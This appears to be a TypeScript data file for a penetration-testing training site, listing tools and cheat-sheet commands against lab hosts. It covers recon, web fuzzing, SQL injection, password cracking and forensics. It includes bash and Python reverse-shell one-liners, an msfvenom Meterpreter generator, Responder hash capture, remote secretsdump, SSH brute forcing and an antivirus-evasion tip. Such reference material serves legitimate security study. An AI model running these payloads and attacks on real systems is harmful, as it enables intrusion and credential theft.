        explanation: "Scans /8 internal subnet for web and SSH ports at 5,000 packets per second.",
      },
    ],
    proTip: "Pipe open ports discovered by Masscan into Nmap for accurate service versioning (`-sV`).",
  },
  {
    id: "rustscan",
    name: "RustScan Modern Port Scanner",
    category: "Recon & OSINT",
    summary: "Modern port scanner written in Rust that scans 65,535 ports in under 3 seconds.",
    usedFor: "Ultra-fast port discovery that automatically pipes open port findings directly into Nmap for script scanning.",
    installCommand: "wget https://github.com/RustScan/RustScan/releases/download/2.1.1/rustscan_2.1.1_amd64.deb && sudo dpkg -i rustscan*.deb",
    difficulty: "Beginner",
    keyFlags: [
      { flag: "-a", label: "Target Address", description: "Target IP or domain address." },
      { flag: "-b", label: "Batch Size", description: "Number of parallel ports to probe concurrently." },
      { flag: "--", label: "Nmap Flags", description: "Passes trailing flags directly to Nmap execution." },
    ],
    commonUseCases: [
      {
        title: "Fast All-Port Scan Piped to Nmap",
        command: "rustscan -a 192.168.1.50 -- -sC -sV",
        explanation: "Finds all open ports in 2 seconds then runs Nmap safe scripts and version detection on discovered ports.",
      },
    ],
    proTip: "Set `--ulimit 5000` to increase socket file descriptors for faster network scanning.",
  },
  {
    id: "ffuf",
    name: "Ffuf Fast Web Fuzzer",
    category: "Web Security",
    summary: "Ultra-fast web fuzzer written in Go for fuzzing directories, files, parameters, and HTTP headers.",
    usedFor: "Discovering hidden endpoints, parameter mining, host header injection, and VHost subdomain fuzzing.",
    installCommand: "sudo apt install ffuf",
    difficulty: "Intermediate",
    keyFlags: [
      { flag: "-u", label: "Target URL", description: "Target URL string containing FUZZ keyword." },
      { flag: "-w", label: "Wordlist", description: "Wordlist path for FUZZ keyword replacement." },
      { flag: "-mc", label: "Match Codes", description: "Match specific HTTP response codes (e.g. 200,301,302)." },
      { flag: "-fs", label: "Filter Size", description: "Filter out response bodies of specific byte size." },
    ],
    commonUseCases: [
      {
        title: "Directory Fuzzing with Custom Keyword",
        command: "ffuf -u http://192.168.1.50/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301",
        explanation: "Fuzzes directory path segment FUZZ and matches HTTP 200/301 status codes.",
      },
      {
        title: "Virtual Host (VHost) Subdomain Mining",
        command: 'ffuf -u http://192.168.1.50 -H "Host: FUZZ.target.lab" -w /usr/share/wordlists/dnsmap.txt -fs 4242',
        explanation: "Discovers unlinked internal virtual host subdomains by fuzzing HTTP Host header.",
      },
    ],
    proTip: "Use `-fs` to filter out default 404 error page size responses when target returns HTTP 200 for all paths.",
  },
  {
    id: "john",
    name: "John the Ripper Password Cracker",
    category: "Password Cracking",
    summary: "Classic CPU-based password hash cracker supporting hundreds of hash and cipher formats.",
    usedFor: "Cracking Linux shadow password hashes (`/etc/shadow`), Windows SAM hashes, ZIP/RAR archive passwords, and SSH key passphrases.",
    installCommand: "sudo apt install john",
    difficulty: "Intermediate",
    keyFlags: [
      { flag: "--wordlist=", label: "Wordlist Path", description: "Dictionary attack mode file path." },
      { flag: "--format=", label: "Hash Format", description: "Specifies hash algorithm (raw-md5, NT, sha512crypt)." },
      { flag: "--rules", label: "Apply Rules", description: "Enables wordlist permutation rules." },
      { flag: "--show", label: "Show Cracked", description: "Displays cracked hashes from john.pot." },
    ],
    commonUseCases: [
      {
        title: "Crack Linux /etc/shadow Hashes",
        command: "unshadow /etc/passwd /etc/shadow > combined.hashes && john --wordlist=/usr/share/wordlists/rockyou.txt combined.hashes",
        explanation: "Merges passwd and shadow files and cracks system root/user password hashes.",
      },
    ],
    proTip: "Use `ssh2john.py id_rsa > hash.txt` to extract password hashes from encrypted SSH private keys before running John.",
  },
  {
    id: "tcpdump",
    name: "Tcpdump CLI Network Packet Sniffer",
    category: "Network & Forensics",
    summary: "Command-line packet analyzer for capturing raw network interface traffic.",
    usedFor: "Capturing network packets, inspecting live TCP/UDP traffic on headless Linux servers, and troubleshooting firewall rules.",
    installCommand: "sudo apt install tcpdump",
    difficulty: "Intermediate",
    keyFlags: [
      { flag: "-i eth0", label: "Interface", description: "Listen on eth0 interface." },
      { flag: "-n", label: "Numeric", description: "Do not resolve hostnames or port names." },
      { flag: "-w dump.pcap", label: "Write File", description: "Save captured packets to PCAP file." },
      { flag: "-A", label: "ASCII Output", description: "Print packet payload in ASCII text." },
    ],
    commonUseCases: [
      {
        title: "Capture Web Traffic to File",
        command: "tcpdump -i eth0 port 80 -w web_traffic.pcap",
        explanation: "Captures all HTTP port 80 traffic on eth0 and writes to web_traffic.pcap.",
      },
    ],
    proTip: "Combine `-v -X` to view hex and ASCII payload contents directly in your terminal.",
  },
  {
    id: "responder",
    name: "Responder LLMNR / NBT-NS Poisoner",
    category: "Exploitation",
    summary: "LLMNR, NBT-NS, and mDNS poisoner for capturing NTLMv1/NTLMv2 hashes on internal Windows networks.",
    usedFor: "Listening on local subnet for failed DNS lookups, impersonating target SMB/HTTP authentication servers, and extracting Windows user hashes.",
    installCommand: "sudo apt install responder",
    difficulty: "Advanced",
    keyFlags: [
      { flag: "-I eth0", label: "Network Interface", description: "Listen on eth0 network adapter." },
      { flag: "-w", label: "WPAR Proxy", description: "Start Rogue WPAD proxy server." },
      { flag: "-v", label: "Verbose Mode", description: "Print detailed log details." },
    ],
    commonUseCases: [
      {
        title: "Poison Subnet to Capture Windows Hashes",
        command: "sudo responder -I eth0 -dwv",
        explanation: "Answers LLMNR broadcast queries on eth0 and logs captured NTLMv2 hashes to disk.",
      },
    ],
    proTip: "Pass captured NTLMv2 hashes directly into Hashcat mode `-m 5600` to crack Windows user passwords.",
  },
  {
    id: "impacket",
    name: "Impacket Network Protocol Suite",
    category: "Exploitation",
    summary: "Python toolkit for working with network protocols, Active Directory, and SMB exploitation.",
    usedFor: "Dumping Active Directory hashes (`secretsdump.py`), executing remote SMB commands (`psexec.py`, `wmiexec.py`), and Kerberos ticket attacks (Kerberoasting, AS-REP Roasting).",
    installCommand: "pip install impacket OR sudo apt install python3-impacket",
    difficulty: "Advanced",
    keyFlags: [
      { flag: "secretsdump.py", label: "Dump NTDS.dit", description: "Extracts Active Directory domain controller hashes." },
      { flag: "psexec.py", label: "SMB Remote Command", description: "Spawns SYSTEM command prompt via SMB service creation." },
      { flag: "GetUserSPNs.py", label: "Kerberoasting", description: "Extracts Kerberos TGS tickets for offline password cracking." },
    ],
    commonUseCases: [
      {
        title: "Dump Windows Hashes Remotely",
        command: "impacket-secretsdump domain.local/admin:password@192.168.1.10",
        explanation: "Dumps SAM and LSA secrets remotely over SMB connection.",
      },
    ],
    proTip: "Use `wmiexec.py` instead of `psexec.py` to avoid triggering basic antivirus service creation alerts.",
  },
  {
    id: "volatility",
    name: "Volatility Memory Forensics Framework",
    category: "Network & Forensics",
    summary: "Advanced RAM memory forensics framework for extracting artifacts from volatility memory dumps.",
    usedFor: "Analyzing RAM memory dumps, extracting active process trees, identifying injected DLLs, extracting cleartext passwords, and performing malware forensics.",
    installCommand: "sudo apt install volatility3",
    difficulty: "Advanced",
    keyFlags: [
      { flag: "windows.pslist", label: "Process List", description: "Lists running processes at time of RAM capture." },
      { flag: "windows.hashdump", label: "Dump SAM Hashes", description: "Extracts cached SAM password hashes from RAM memory." },
      { flag: "windows.malfind", label: "Malware Injection", description: "Scans RAM for hidden or injected executable code." },
    ],
    commonUseCases: [
      {
        title: "Extract Process List from Memory Dump",
        command: "vol -f memory.raw windows.pslist",
        explanation: "Lists active processes, parent process IDs, and execution timestamps from raw RAM dump.",
      },
    ],
    proTip: "Use `windows.netscan` in Volatility 3 to reconstruct active network socket connections when memory was captured.",
  },
];

export const CHEATSHEETS: CommandItem[] = [
  // ==========================================
  // LINUX COMMANDS FOR CYBERSECURITY
  // ==========================================
  {
    id: "linux-suid-find",
    tool: "Linux CLI",
    category: "Linux CLI",
    title: "Find SUID Executables (Privilege Escalation)",
    command: "find / -perm -u=s -type f 2>/dev/null",
    description:
      "Locates binaries on the file system with the SUID (Set User ID) bit set. SUID binaries run with the privileges of the file owner (often root), serving as prime privilege escalation targets.",
    flagsBreakdown: [
      { flag: "find /", description: "Search starting from root directory" },
      { flag: "-perm -u=s", description: "Filter for files where user permission has SUID bit" },
      { flag: "-type f", description: "Include regular files only" },
      { flag: "2>/dev/null", description: "Suppress stderr permission error messages" },
    ],
    tags: ["privesc", "suid", "linux", "permissions", "enumeration"],
  },
  {
    id: "linux-sudo-list",
    tool: "Linux CLI",
    category: "Linux CLI",
    title: "Check Sudo Privileges & GTFOBins Allowed Commands",
    command: "sudo -l",
    description:
      "Lists allowed (and forbidden) commands for the current user according to /etc/sudoers. Check GTFOBins for any command listing `(root) NOPASSWD:`.",
    tags: ["privesc", "sudo", "linux", "gtfobins"],
  },
  {
    id: "linux-netstat-listeners",
    tool: "Linux CLI",
    category: "Linux CLI",
    title: "Enumerate Open Network Ports & Active Connections",
    command: "ss -tulpn  # OR netstat -tulpn",
    description:
      "Displays all active listening TCP and UDP sockets along with the process ID (PID) and program name using the socket.",
    flagsBreakdown: [
      { flag: "-t", description: "TCP sockets" },
      { flag: "-u", description: "UDP sockets" },
      { flag: "-l", description: "Listening sockets only" },
      { flag: "-p", description: "Show process ID / program name" },
      { flag: "-n", description: "Numeric addresses (do not resolve names)" },
    ],
    tags: ["networking", "ports", "linux", "enumeration"],
  },
  {
    id: "linux-cron-jobs",
    tool: "Linux CLI",
    category: "Linux CLI",
    title: "Inspect Scheduled Cron Jobs & System Timers",
    command: "cat /etc/crontab /etc/cron.*/* ~/.selected_editor 2>/dev/null",
    description:
      "Examines scheduled cron tasks across system directories. Writable script paths or wildcard expansion (`*`) in cron commands lead to instant root privilege escalation.",
    tags: ["privesc", "cron", "linux", "persistence"],
  },
  {
    id: "linux-grep-passwords",
    tool: "Linux CLI",
    category: "Linux CLI",
    title: "Recursive Grep for Passwords & Hardcoded Keys",
    command: "grep -rnwi '/var/www/' -e 'password' -e 'api_key' -e 'db_pass' 2>/dev/null",
    description:
      "Searches target directories recursively for plain-text password strings, database credentials, and secret configuration keys.",
    flagsBreakdown: [
      { flag: "-r", description: "Recursive subdirectories search" },
      { flag: "-n", description: "Print line numbers" },
      { flag: "-w", description: "Match whole words only" },
      { flag: "-i", description: "Case-insensitive matching" },
    ],
    tags: ["linux", "grep", "passwords", "config", "enumeration"],
  },
  {
    id: "linux-file-permissions",
    tool: "Linux CLI",
    category: "Linux CLI",
    title: "Find World-Writable Files & Directories",
    command: "find / -writable -type d 2>/dev/null  # Writable folders\nfind / -perm -2 -type f 2>/dev/null       # World-writable files",
    description:
      "Discovers directory locations or scripts that unprivileged users can modify or overwrite to hijack execution paths.",
    tags: ["linux", "permissions", "writable", "privesc"],
  },

  // ==========================================
  // PYTHON FOR CYBERSECURITY
  // ==========================================
  {
    id: "py-port-scanner",
    tool: "Python 3",
    category: "Python Cyber",
    title: "Fast Socket TCP Port Scanner Script",
    command: "python3 port_scan.py 192.168.56.101 20 100",
    description:
      "Python standard library script using `socket` to scan a target IP address for open TCP ports without external third-party dependencies.",
    codeSnippet: `import socket
import sys

target = sys.argv[1] if len(sys.argv) > 1 else "192.168.56.101"
start_port = int(sys.argv[2]) if len(sys.argv) > 2 else 1
end_port = int(sys.argv[3]) if len(sys.argv) > 3 else 1024

print(f"[*] Scanning target: {target} (Ports {start_port}-{end_port})")

for port in range(start_port, end_port + 1):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(0.5)
    result = sock.connect_ex((target, port))
    if result == 0:
        print(f"[+] Port {port}: OPEN")
    sock.close()`,
    tags: ["python", "socket", "portscanner", "recon", "scripting"],
  },
  {
    id: "py-http-bruteforce",
    tool: "Python 3",
    category: "Python Cyber",
    title: "HTTP Login Brute-Forcer with Requests",
    command: "python3 http_login.py http://192.168.56.102:3000/rest/user/login admin wordlist.txt",
    description:
      "Automates POST requests against web login endpoints with JSON or form-encoded payloads using Python `requests` library.",
    codeSnippet: `import requests

url = "http://192.168.56.102:3000/rest/user/login"
email = "admin@juice-sh.op"
passwords = ["123456", "password", "admin123", "' OR 1=1--"]

for password in passwords:
    payload = {"email": email, "password": password}
    response = requests.post(url, json=payload)
    if response.status_code == 200 and "token" in response.text:
        print(f"[SUCCESS] Cracked Password: {password}")
        break
    else:
        print(f"[-] Failed: {password}")`,
    tags: ["python", "requests", "http", "bruteforce", "web"],
  },
  {
    id: "py-hash-cracker",
    tool: "Python 3",
    category: "Python Cyber",
    title: "MD5 / SHA256 Hash Cracker with Hashlib",
    command: "python3 crack_hash.py 5f4dcc3b5aa765d61d8327deb882cf99 rockyou.txt",
    description:
      "Python dictionary hash cracking script using built-in `hashlib` module to crack MD5, SHA1, or SHA256 hashes against a wordlist.",
    codeSnippet: `import hashlib
import sys

target_hash = "5f4dcc3b5aa765d61d8327deb882cf99" # 'password'
wordlist_path = "/usr/share/wordlists/rockyou.txt"

with open(wordlist_path, "r", encoding="latin-1") as f:
    for word in f:
        word = word.strip()
        hashed_word = hashlib.md5(word.encode()).hexdigest()
        if hashed_word == target_hash:
            print(f"[+] FOUND MATCH: {word}")
            sys.exit(0)
print("[-] Hash not found in wordlist.")`,
    tags: ["python", "hashlib", "cracking", "md5", "sha256"],
  },
  {
    id: "py-b64-jwt",
    tool: "Python 3",
    category: "Python Cyber",
    title: "JWT Token Decoder & Base64 Converter",
    command: "python3 decode_jwt.py <JWT_TOKEN>",
    description:
      "Decodes JSON Web Token (JWT) headers and payloads without verifying signatures using `base64` and `json` modules.",
    codeSnippet: `import base64
import json

def decode_jwt(jwt_token):
    parts = jwt_token.split(".")
    if len(parts) != 3:
        return "Invalid JWT Format"
    header = json.loads(base64.urlsafe_b64decode(parts[0] + "==").decode())
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + "==").decode())
    return {"header": header, "payload": payload}

# Example usage:
jwt_sample = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwicm9sZSI6ImFkbWluIn0.signature"
print(json.dumps(decode_jwt(jwt_sample), indent=2))`,
    tags: ["python", "jwt", "base64", "decoding", "tokens"],
  },

  // ==========================================
  // NETWORK & RECONNAISSANCE TOOLS
  // ==========================================
  {
    id: "tool-nmap-fast",
    tool: "Nmap",
    category: "Network & Recon",
    title: "Nmap SYN Stealth Version & Script Scan",
    command: "sudo nmap -sS -sV -sC -Pn -T4 192.168.56.101",
    description:
      "The quintessential network scanning command. Performs a TCP SYN stealth scan with version detection and default NSE vulnerability scripts.",
    flagsBreakdown: [
      { flag: "-sS", description: "SYN Stealth Scan (half-open TCP)" },
      { flag: "-sV", description: "Probe open ports for service version details" },
      { flag: "-sC", description: "Run default Nmap scripts (NSE banner & vuln detection)" },
      { flag: "-Pn", description: "Skip ICMP ping host discovery" },
      { flag: "-T4", description: "Set timing template 4 (faster scan)" },
    ],
    tags: ["nmap", "recon", "ports", "scanning", "services"],
  },
  {
    id: "tool-netcat-listener",
    tool: "Netcat / Nc",
    category: "Network & Recon",
    title: "Netcat Reverse Shell Listener",
    command: "nc -lvnp 4444",
    description:
      "Starts an interactive TCP listener on port 4444 to catch inbound reverse shell connections from victim machines.",
    flagsBreakdown: [
      { flag: "-l", description: "Listen mode for incoming connections" },
      { flag: "-v", description: "Verbose output" },
      { flag: "-n", description: "Numeric IP addresses (no DNS resolution)" },
      { flag: "-p 4444", description: "Specify local port number" },
    ],
    tags: ["netcat", "nc", "listener", "shells", "networking"],
  },
  {
    id: "tool-tshark-pcap",
    tool: "TShark",
    category: "Network & Recon",
    title: "TShark Capture & HTTP Filter",
    command: "tshark -i eth0 -Y 'http.request.method == \"POST\"' -T fields -e http.file_data",
    description:
      "Command-line Wireshark network packet analyzer filtering live traffic for POST request parameters and cleartext login forms.",
    tags: ["tshark", "wireshark", "packets", "pcap", "sniffing"],
  },

  // ==========================================
  // WEB EXPLOITATION TOOLS
  // ==========================================
  {
    id: "tool-gobuster-dir",
    tool: "Gobuster",
    category: "Web Exploitation",
    title: "Gobuster Directory & Extension Fuzzing",
    command: "gobuster dir -u http://192.168.56.102:3000/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,json -t 40",
    description:
      "Brute-forces web directories and hidden filenames using multi-threaded HTTP requests.",
    flagsBreakdown: [
      { flag: "dir", description: "Directory enumeration mode" },
      { flag: "-u <URL>", description: "Target base URL" },
      { flag: "-w <PATH>", description: "Wordlist location" },
      { flag: "-x php,txt", description: "File extensions to append" },
      { flag: "-t 40", description: "Number of concurrent threads" },
    ],
    tags: ["gobuster", "web", "fuzzing", "directories", "enumeration"],
  },
  {
    id: "tool-ffuf-fuzz",
    tool: "FFuf",
    category: "Web Exploitation",
    title: "FFuf Parameter & Header Fuzzing",
    command: "ffuf -u http://192.168.56.102:3000/rest/products/search?q=FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 200",
    description:
      "Ultra-fast web fuzzer replacement for DirBuster and Wfuzz. Replaces the keyword `FUZZ` in URLs, headers, or POST bodies with wordlist lines.",
    tags: ["ffuf", "web", "fuzzing", "parameters", "directory"],
  },
  {
    id: "tool-sqlmap-dump",
    tool: "Sqlmap",
    category: "Web Exploitation",
    title: "Sqlmap Automatic Database Dump",
    command: "sqlmap -u \"http://192.168.56.103/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit\" --cookie=\"PHPSESSID=xyz; security=low\" --dump",
    description:
      "Automates detection and exploitation of SQL injection vulnerabilities, extracting database schemas, tables, user hashes, and contents.",
    flagsBreakdown: [
      { flag: "-u <URL>", description: "Target HTTP GET URL" },
      { flag: "--cookie", description: "Pass authenticated session cookies" },
      { flag: "--dump", description: "Dump all DBMS database table entries" },
    ],
    tags: ["sqlmap", "sqli", "database", "dump", "web"],
  },

  // ==========================================
  // PASSWORD CRACKING & HASHES
  // ==========================================
  {
    id: "tool-john-shadow",
    tool: "John the Ripper",
    category: "Password Cracking",
    title: "Crack Linux /etc/shadow Passwords",
    command: "unshadow /etc/passwd /etc/shadow > unshadowed.txt\njohn --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt",
    description:
      "Combines /etc/passwd and /etc/shadow using `unshadow` and launches John the Ripper dictionary attack using RockYou wordlist.",
    tags: ["john", "shadow", "passwords", "linux", "cracking"],
  },
  {
    id: "tool-hashcat-md5",
    tool: "Hashcat",
    category: "Password Cracking",
    title: "Hashcat MD5 / NTLM Dictionary Crack",
    command: "hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule",
    description:
      "Runs GPU-accelerated Hashcat against MD5 (`-m 0`) or NTLM (`-m 1000`) hashes with mutation rules.",
    tags: ["hashcat", "md5", "ntlm", "gpu", "cracking"],
  },
  {
    id: "tool-hydra-ssh",
    tool: "Hydra",
    category: "Password Cracking",
    title: "Hydra SSH Brute-Force Attack",
    command: "hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.56.101 ssh -t 4",
    description:
      "Launches targeted online login password guessing against SSH service on port 22.",
    tags: ["hydra", "ssh", "bruteforce", "login", "credentials"],
  },

  // ==========================================
  // REVERSE SHELLS & EXPLOITATION
  // ==========================================
  {
    id: "shell-bash-reverse",
    tool: "Bash / Netcat",
    category: "Reverse Shells & Exploits",
    title: "Bash One-Liner Reverse Shell",
    command: "bash -i >& /dev/tcp/192.168.56.1/4444 0>&1",
    description:
      "Standard interactive Bash reverse shell payload redirecting stdin and stdout to an attacker TCP listener.",
    tags: ["reverse-shell", "bash", "payload", "exploitation"],
  },
  {
    id: "shell-python-reverse",
    tool: "Python 3",
    category: "Reverse Shells & Exploits",
    title: "Python 3 One-Liner Reverse Shell",
    command: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`,
    description:
      "Cross-platform Python reverse shell one-liner executing socket redirection to `/bin/sh`.",
    tags: ["python", "reverse-shell", "payload", "one-liner"],
  },
  {
    id: "tool-msfvenom-elf",
    tool: "Msfvenom",
    category: "Reverse Shells & Exploits",
    title: "Msfvenom Linux ELF Reverse Shell Generator",
    command: "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f elf -o shell.elf",
    description:
      "Generates a standalone Linux executable (ELF) binary containing a Meterpreter reverse TCP payload.",
    flagsBreakdown: [
      { flag: "-p <PAYLOAD>", description: "Metasploit payload specification" },
      { flag: "LHOST=<IP>", description: "Attacker IP address for reverse connection" },
      { flag: "LPORT=<PORT>", description: "Attacker listening port" },
      { flag: "-f elf", description: "Output format: Linux ELF executable" },
      { flag: "-o shell.elf", description: "Output filename" },
    ],
    tags: ["msfvenom", "metasploit", "elf", "payload", "reverse-shell"],
  },

  // ==========================================
  // INFORMATION GATHERING & OSINT TOOLS (PDF LESSON)
  // ==========================================
  {
    id: "osint-cherrytree",
    tool: "CherryTree",
    category: "OSINT & Info Gathering",
    title: "CherryTree Recon Data Organization & Note Taking",
    command: "cherrytree notes_recon.ctd",
    description:
      "A hierarchical, tree-based note-taking application used to organize and structure reconnaissance data, target maps, credentials, and evidence.",
    tags: ["cherrytree", "notes", "recon", "documentation", "osint"],
  },
  {
    id: "osint-whois",
    tool: "Whois CLI",
    category: "OSINT & Info Gathering",
    title: "Whois Public Domain Registration & IP Range Lookup",
    command: "whois target-corp.lab",
    description:
      "Used to query public domain registration details, registrant contact info, name servers, creation dates, and IP address ranges.",
    flagsBreakdown: [
      { flag: "whois <domain>", description: "Query WHOIS database for registered domain ownership" },
    ],
    tags: ["whois", "dns", "domain", "recon", "osint"],
  },
  {
    id: "osint-dmitry",
    tool: "Dmitry",
    category: "OSINT & Info Gathering",
    title: "Deepmagic Information Gathering Tool (Dmitry)",
    command: "dmitry -winsp target-corp.lab",
    description:
      "Used to collect basic host details, WHOIS records, subdomains, open TCP ports, uptime, and email addresses in a single run.",
    flagsBreakdown: [
      { flag: "-w", description: "Perform WHOIS lookup on target domain" },
      { flag: "-i", description: "Perform WHOIS lookup on target IP address" },
      { flag: "-n", description: "Retrieve Netcraft info on target" },
      { flag: "-s", description: "Search for subdomains" },
      { flag: "-p", description: "Perform TCP port scan" },
    ],
    tags: ["dmitry", "recon", "whois", "subdomains", "ports"],
  },
  {
    id: "osint-theharvester",
    tool: "theHarvester",
    category: "OSINT & Info Gathering",
    title: "theHarvester OSINT Email & Host Harvester",
    command: "theHarvester -d target-corp.lab -b google,bing,crtsh,dnsdumpster -l 500",
    description:
      "Simulates crawling to gather emails, subdomains, hosts, employee names, and open ports from public search engines and OSINT sources.",
    flagsBreakdown: [
      { flag: "-d <domain>", description: "Target domain name" },
      { flag: "-b <source>", description: "Public search engine & OSINT sources" },
      { flag: "-l <limit>", description: "Limit number of search results retrieved" },
    ],
    tags: ["theharvester", "emails", "subdomains", "osint", "crawling"],
  },
  {
    id: "osint-subfinder",
    tool: "subfinder",
    category: "OSINT & Info Gathering",
    title: "subfinder Active/Passive Subdomain Discovery",
    command: "subfinder -d target-corp.lab -v",
    description:
      "An active/passive tool used for discovering subdomains of a target domain using passive online data sources.",
    flagsBreakdown: [
      { flag: "-d <domain>", description: "Target domain to enumerate" },
      { flag: "-v", description: "Enable verbose output" },
      { flag: "-all", description: "Use all passive discovery sources" },
    ],
    tags: ["subfinder", "subdomains", "dns", "passive-recon", "osint"],
  },
  {
    id: "osint-dig-nslookup",
    tool: "nslookup / dig",
    category: "OSINT & Info Gathering",
    title: "DNS Record Resolution & Exploration (nslookup / dig)",
    command: "dig target-corp.lab ANY +noall +answer\n# OR: nslookup -type=any target-corp.lab",
    description:
      "CLI utilities used to resolve DNS records (A, AAAA, MX, NS, SOA, TXT).",
    flagsBreakdown: [
      { flag: "dig <domain> ANY", description: "Query all standard DNS records for target" },
      { flag: "+short", description: "Print brief record answers only" },
    ],
    tags: ["dig", "nslookup", "dns", "records", "recon"],
  },
  {
    id: "osint-dnsrecon",
    tool: "Dnsrecon",
    category: "OSINT & Info Gathering",
    title: "Dnsrecon Advanced DNS Recon & Zone Transfer",
    command: "dnsrecon -d target-corp.lab -t axfr",
    description:
      "An advanced DNS reconnaissance tool for subdomains, MX records, and AXFR zone transfer attacks.",
    flagsBreakdown: [
      { flag: "-d <domain>", description: "Target domain for enumeration" },
      { flag: "-t axfr", description: "Attempt unauthenticated zone transfer" },
      { flag: "-t std", description: "Perform standard record checks" },
    ],
    tags: ["dnsrecon", "dns", "axfr", "zonetransfer", "subdomains"],
  },
  {
    id: "osint-fierce",
    tool: "Fierce",
    category: "OSINT & Info Gathering",
    title: "Fierce DNS Reconnaissance & IP Block Discovery",
    command: "fierce --domain target-corp.lab",
    description:
      "A DNS reconnaissance tool designed to locate subdomains and non-contiguous IP blocks assigned to a target organization.",
    flagsBreakdown: [
      { flag: "--domain <domain>", description: "Specify target domain name" },
      { flag: "--wide", description: "Scan wider IP address ranges around discovered targets" },
    ],
    tags: ["fierce", "dns", "subdomains", "ip-blocks", "recon"],
  },
  {
    id: "osint-dirsearch",
    tool: "dirsearch",
    category: "OSINT & Info Gathering",
    title: "dirsearch Web Directory & Hidden Endpoint Brute-Forcing",
    command: "dirsearch -u http://target-corp.lab -e php,html,js,txt -w /usr/share/wordlists/dirb/common.txt",
    description:
      "Used to brute-force web servers for hidden directories, files, or forgotten login pages.",
    flagsBreakdown: [
      { flag: "-u <URL>", description: "Target base web URL" },
      { flag: "-e <ext>", description: "File extensions to append to dictionary words" },
      { flag: "-t 50", description: "Set concurrent HTTP request threads" },
    ],
    tags: ["dirsearch", "web", "bruteforce", "hidden-files", "directories"],
  },
  {
    id: "osint-whatweb",
    tool: "whatweb",
    category: "OSINT & Info Gathering",
    title: "WhatWeb Web Technology Scanner & Fingerprinter",
    command: "whatweb -a 3 http://target-corp.lab",
    description:
      "Web technology scanner used to identify CMS platforms, web servers, framework versions, embedded analytics, and headers.",
    flagsBreakdown: [
      { flag: "-a 1", description: "Stealthy single HTTP request scan" },
      { flag: "-a 3", description: "Aggressive scan triggering plugin probes" },
    ],
    tags: ["whatweb", "fingerprint", "cms", "technology", "web"],
  },
  {
    id: "osint-masscan",
    tool: "Masscan / Nmap",
    category: "OSINT & Info Gathering",
    title: "Masscan High-Speed Asynchronous Port Scanner",
    command: "masscan 192.168.56.0/24 -p1-1000 --rate=1000",
    description:
      "High-speed network mapping and port-scanning tool capable of scanning subnets and ports asynchronously.",
    flagsBreakdown: [
      { flag: "-p1-1000", description: "Specify target port range" },
      { flag: "--rate=1000", description: "Set packet transmit rate per second" },
    ],
    tags: ["masscan", "nmap", "ports", "recon", "network"],
  },
  {
    id: "osint-sqlmap",
    tool: "sqlmap",
    category: "OSINT & Info Gathering",
    title: "sqlmap Automatic SQL Injection & DB Enumeration",
    command: "sqlmap -u \"http://target-corp.lab/item?id=1\" --batch --dbs",
    description:
      "Automated tool used to detect and exploit SQL injection vulnerabilities and enumerate backend database structures.",
    flagsBreakdown: [
      { flag: "-u <URL>", description: "Target vulnerable HTTP endpoint" },
      { flag: "--dbs", description: "Enumerate available database names" },
      { flag: "--batch", description: "Never ask for user input, use default behavior" },
    ],
    tags: ["sqlmap", "sqli", "database", "recon", "exploitation"],
  },
  {
    id: "osint-gitleaks",
    tool: "GitLeaks",
    category: "OSINT & Info Gathering",
    title: "GitLeaks Secret & API Token Repository Scanner",
    command: "gitleaks detect --source . -v",
    description:
      "Used to scan Git repositories and local source code for hardcoded secrets, passwords, API keys, or JWT tokens.",
    flagsBreakdown: [
      { flag: "detect", description: "Scan source tree for known regex secret patterns" },
      { flag: "--source .", description: "Target source folder path" },
      { flag: "-v", description: "Verbose mode listing match commits and lines" },
    ],
    tags: ["gitleaks", "git", "secrets", "api-keys", "tokens"],
  },
  {
    id: "osint-metasploit",
    tool: "Metasploit",
    category: "OSINT & Info Gathering",
    title: "Metasploit OSINT Email & Host Harvester Module",
    command: "msfconsole -q -x \"use auxiliary/gather/search_email_collector; set DOMAIN target-corp.lab; run\"",
    description:
      "A penetration testing framework containing exploit modules and auxiliary OSINT gathering plugins like email collectors and search crawlers.",
    tags: ["metasploit", "msf", "auxiliary", "emails", "osint"],
  },
  {
    id: "osint-telnet",
    tool: "telnet",
    category: "OSINT & Info Gathering",
    title: "Telnet Manual Banner Grabbing & Service Check",
    command: "telnet target-corp.lab 25\nEHLO test.com",
    description:
      "CLI protocol used to manually connect to open ports (e.g., checking port 25 for open mail relays or port 80/21 service banners).",
    tags: ["telnet", "banner-grabbing", "smtp", "ports", "manual-recon"],
  },
  {
    id: "osint-google-dorks",
    tool: "Google Dorks",
    category: "OSINT & Info Gathering",
    title: "Google Hacking & Advanced Search Operators",
    command: "site:target-corp.lab filetype:pdf OR filetype:xls OR inurl:admin",
    description:
      "Using advanced search queries (e.g., site:, inurl:, filetype:, intitle:) to extract indexed sensitive documents, database backups, and exposed login portals.",
    flagsBreakdown: [
      { flag: "site:target.com", description: "Limit results to target domain" },
      { flag: "filetype:pdf", description: "Filter results by specific file extension" },
      { flag: "inurl:admin", description: "Find URLs containing specific keyword" },
    ],
    tags: ["google-dorks", "google", "osint", "dorking", "search-engine"],
  },
  {
    id: "osint-wayback",
    tool: "Wayback Machine",
    category: "OSINT & Info Gathering",
    title: "Wayback Machine Archive Lookup & waybackurls",
    command: "waybackurls target-corp.lab | grep -iE '\\.js|\\.json|\\.bak|\\.env'",
    description:
      "Used to retrieve historical snapshots of websites, deleted pages, forgotten subdomains, or outdated API endpoints.",
    tags: ["wayback", "archive", "history", "endpoints", "osint"],
  },
  {
    id: "osint-dnsdumpster",
    tool: "DNSDumpster",
    category: "OSINT & Info Gathering",
